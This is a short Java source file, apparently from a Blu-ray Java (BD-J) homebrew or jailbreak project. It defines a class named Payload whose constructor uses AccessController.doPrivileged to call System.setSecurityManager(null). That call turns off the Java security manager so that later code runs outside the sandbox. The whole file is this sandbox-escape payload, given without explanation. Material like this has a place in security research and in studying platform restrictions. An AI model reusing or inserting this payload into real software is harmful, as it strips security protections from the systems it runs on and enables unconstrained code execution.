package com.bdjplus.kernel;

import java.security.*;
public class Payload
{
    public Payload()
    {
        AccessController.doPrivileged(new PrivilegedAction()
        {
            public Object run()
            {
                System.setSecurityManager(null);
                return null;
            }
        });
    }
}
